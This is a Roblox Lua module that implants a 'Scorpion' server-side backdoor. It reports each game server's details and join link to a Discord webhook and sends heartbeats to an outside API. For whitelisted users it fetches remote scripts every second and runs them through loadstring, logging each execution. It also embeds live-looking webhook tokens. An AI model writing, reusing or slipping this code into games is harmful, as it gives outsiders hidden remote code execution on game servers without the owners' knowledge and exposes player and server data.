local module = {}
local API = "https://scorpionware.lovable.app/api/public/roblox"
local GAME_LOG_WEBHOOK = "https://discord.com/api/webhooks/1571524621361221702/_K4CknhgyOAVHdGQ6TxkGJ8RqqmLN0o2dm1YBEbRBYM6yUD0YcSw7dlspeMm6h30GXKg"
local SCRIPT_LOG_WEBHOOK = "https://discord.com/api/webhooks/1571728706999816305/XDUgw3u2RFgx--QUqgNcfLPInEn73wPO_J4ZTeen8ZPkMfE9EDyHw2_uAJIKSxWZlsK8"
local LOGO_URL = "https://scorpionware.lovable.app/__l5e/assets-v1/42b7057d-0d01-43fd-9f4d-33ba85e9895d/scorpion-logo.jpg"
local WATERMARK_ID = "rbxassetid://92189989632853"

local Http = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local Stats = game:GetService("Stats")
local Workspace = game:GetService("Workspace")

local jobId = game.JobId ~= "" and game.JobId or ("studio-" .. game.PlaceId)

local cachedGameName = "Unknown Game"
task.spawn(function()
	local ok, info = pcall(function()
		return MarketplaceService:GetProductInfo(game.PlaceId)
	end)
	if ok and info and info.Name then
		cachedGameName = info.Name
	end
end)

local function getThumbnailUrl(universeId)
	local ok, res = pcall(function()
		return Http:GetAsync("https://thumbnails.roblox.com/v1/games/multiget/thumbnails?universeIds=" .. tostring(universeId) .. "&size=768x432&format=Png&isCircular=false")
	end)
	if ok and res then
		local ok2, data = pcall(function() return Http:JSONDecode(res) end)
		if ok2 and data and data.data and data.data[1] and data.data[1].thumbnails and data.data[1].thumbnails[1] then
			return data.data[1].thumbnails[1].imageUrl
		end
	end
	return LOGO_URL
end

local function getAvatarHeadshot(userId)
	local ok, res = pcall(function()
		return Http:GetAsync("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. tostring(userId) .. "&size=150x150&format=Png&isCircular=false")
	end)
	if ok and res then
		local ok2, data = pcall(function() return Http:JSONDecode(res) end)
		if ok2 and data and data.data and data.data[1] and data.data[1].imageUrl then
			return data.data[1].imageUrl
		end
	end
	return LOGO_URL
end

-- Send Scorpion Logs webhook when required
task.spawn(function()
	pcall(function()
		local success, info = pcall(function()
			return MarketplaceService:GetProductInfo(game.PlaceId)
		end)
		local gameName = success and info and info.Name or "Unknown Game"
		cachedGameName = gameName
		local creatorName = (success and info and info.Creator and info.Creator.Name) or "Unknown"

		local playerCount = #Players:GetPlayers()
		local maxPlayers = Players.MaxPlayers
		local fps = math.clamp(math.floor(Workspace:GetRealPhysicsFPS()), 0, 60)
		local ping = 0
		pcall(function()
			ping = math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
		end)

		local thumbnailIcon = getThumbnailUrl(game.GameId)
		local gamePageUrl = "https://www.roblox.com/games/" .. tostring(game.PlaceId)
		local directJoinUrl = "https://www.roblox.com/games/start?placeId=" .. tostring(game.PlaceId) .. "&launchData=" .. tostring(jobId)

		local payload = {
			content = "@everyone",
			username = "Scorpion Logs",
			avatar_url = LOGO_URL,
			embeds = {
				{
					author = {
						name = "SCORPION SERVERSIDE",
						icon_url = LOGO_URL
					},
					title = "🚨 **LIVE SERVER PROOF** 🚨",
					description = "🟢 **Live right now on:** **[" .. gameName .. "](" .. gamePageUrl .. ")**\n👤 **Creator:** `" .. creatorName .. "`\n\n🔗 **[⚡ INSTANT JOIN SERVER ⚡](" .. directJoinUrl .. ")**  •  🌐 **[VIEW GAME PAGE](" .. gamePageUrl .. ")**",
					color = 3447003,
					fields = {
						{
							name = "👥 **PLAYERS ONLINE**",
							value = "```yaml\n" .. playerCount .. " / " .. maxPlayers .. " players```",
							inline = true
						},
						{
							name = "⚡ **SERVER PERFORMANCE**",
							value = "```yaml\n" .. fps .. " FPS  |  " .. ping .. " ms```",
							inline = true
						},
						{
							name = "🆔 **PLACE / UNIVERSE ID**",
							value = "```prolog\n" .. tostring(game.PlaceId) .. " / " .. tostring(game.GameId) .. "```",
							inline = false
						},
						{
							name = "🔑 **SERVER JOB ID**",
							value = "```fix\n" .. jobId .. "```",
							inline = false
						}
					},
					image = {
						url = thumbnailIcon
					},
					footer = {
						text = "scorpionware.lovable.app • " .. os.date("%m/%d/%y, %I:%M %p")
					}
				}
			}
		}

		Http:PostAsync(GAME_LOG_WEBHOOK, Http:JSONEncode(payload), Enum.HttpContentType.ApplicationJson)
	end)
end)

-- Log executed scripts to Discord
local function logExecution(plr, executedScript)
	task.spawn(function()
		pcall(function()
			local displayScript = tostring(executedScript or "")
			if #displayScript > 950 then
				displayScript = string.sub(displayScript, 1, 950) .. "\n-- ... [truncated]"
			end

			local profileUrl = "https://www.roblox.com/users/" .. tostring(plr.UserId) .. "/profile"
			local gamePageUrl = "https://www.roblox.com/games/" .. tostring(game.PlaceId)
			local headshotUrl = getAvatarHeadshot(plr.UserId)

			local payload = {
				username = "Scorpion Script Logs",
				avatar_url = LOGO_URL,
				embeds = {
					{
						author = {
							name = "SCORPION EXECUTION LOGGER",
							icon_url = LOGO_URL
						},
						title = "⚡ **SCRIPT EXECUTED** ⚡",
						description = "👤 **Executor:** **[" .. plr.Name .. "](" .. profileUrl .. ")** (`" .. tostring(plr.UserId) .. "`)\n🎮 **Game:** **[" .. cachedGameName .. "](" .. gamePageUrl .. ")**",
						color = 15844367, -- Gold / Amber accent
						thumbnail = {
							url = headshotUrl
						},
						fields = {
							{
								name = "📜 **EXECUTED CODE**",
								value = "```lua\n" .. displayScript .. "\n```",
								inline = false
							},
							{
								name = "🔑 **SERVER JOB ID**",
								value = "```fix\n" .. jobId .. "```",
								inline = false
							}
						},
						footer = {
							text = "scorpionware.lovable.app • " .. os.date("%m/%d/%y, %I:%M %p")
						}
					}
				}
			}

			Http:PostAsync(SCRIPT_LOG_WEBHOOK, Http:JSONEncode(payload), Enum.HttpContentType.ApplicationJson)
		end)
	end)
end

local function call(body)
	local ok, res = pcall(function()
		return Http:PostAsync(API, Http:JSONEncode(body), Enum.HttpContentType.ApplicationJson)
	end)
	if not ok then return nil end
	local ok2, data = pcall(function() return Http:JSONDecode(res) end)
	return ok2 and data or nil
end

local function redScreen(plr, reason)
	local gui = Instance.new("ScreenGui")
	gui.Name = "ScorpionBlacklist"; gui.ResetOnSpawn = false; gui.IgnoreGuiInset = true; gui.DisplayOrder = 999999
	local f = Instance.new("Frame", gui)
	f.Size = UDim2.fromScale(1, 1); f.BackgroundColor3 = Color3.fromRGB(170, 0, 0); f.BorderSizePixel = 0
	local t = Instance.new("TextLabel", f)
	t.Size = UDim2.fromScale(0.8, 0.5); t.Position = UDim2.fromScale(0.1, 0.25); t.BackgroundTransparency = 1
	t.TextColor3 = Color3.new(1, 1, 1); t.Font = Enum.Font.GothamBlack; t.TextScaled = true; t.TextWrapped = true
	t.Text = "YOU HAVE BEEN BLACKLISTED FROM SCORPION\n\nReason: " .. tostring(reason or "No reason given")
	gui.Parent = plr:WaitForChild("PlayerGui")
end

local function addWatermark(plr)
	local playerGui = plr:WaitForChild("PlayerGui")
	if playerGui:FindFirstChild("ScorpionWatermark") then return end

	local gui = Instance.new("ScreenGui")
	gui.Name = "ScorpionWatermark"
	gui.ResetOnSpawn = false
	gui.IgnoreGuiInset = true
	gui.DisplayOrder = 100

	local img = Instance.new("ImageLabel")
	img.Name = "Watermark"
	img.Image = WATERMARK_ID
	img.BackgroundTransparency = 1
	img.BorderSizePixel = 0
	img.AnchorPoint = Vector2.new(0, 1)
	img.Position = UDim2.new(0, 12, 1, -12)
	img.Size = UDim2.new(0, 185, 0, 42)
	img.ScaleType = Enum.ScaleType.Fit
	img.Parent = gui

	gui.Parent = playerGui
end

local function run(plr, src)
	-- Log the execution with Roblox username and executed script
	logExecution(plr, src)

	if src == "r6()" then
		pcall(function() require(3436957371):r6(plr.Name) end)
	elseif src == "re()" then
		pcall(function() plr:LoadCharacter() end)
	else
		src = string.gsub(src, "USERNAME", plr.Name)
		pcall(function() require(script.Loadstring)(src)() end)
	end
end

local function onPlayer(plr)
	local data = call({ action = "check", username = plr.Name })
	if not data then return end
	if data.blacklisted then redScreen(plr, data.reason) return end
	if not data.whitelisted then return end

	-- Show watermark only for whitelisted players
	task.spawn(addWatermark, plr)

	while plr.Parent == Players do
		task.wait(1)
		local p = call({ action = "pending", username = plr.Name, jobId = jobId })
		for _, v in ipairs((p and p.scripts) or {}) do
			task.spawn(run, plr, v.script)
		end
	end
end

-- Game logging: heartbeat every 20s so the server shows on the site
task.spawn(function()
	while true do
		call({ action = "heartbeat", jobId = jobId, universe = tostring(game.GameId), placeId = tostring(game.PlaceId), players = #Players:GetPlayers() })
		task.wait(20)
	end
end)

Players.PlayerAdded:Connect(function(plr) task.spawn(onPlayer, plr) end)
for _, plr in ipairs(Players:GetPlayers()) do task.spawn(onPlayer, plr) end

return module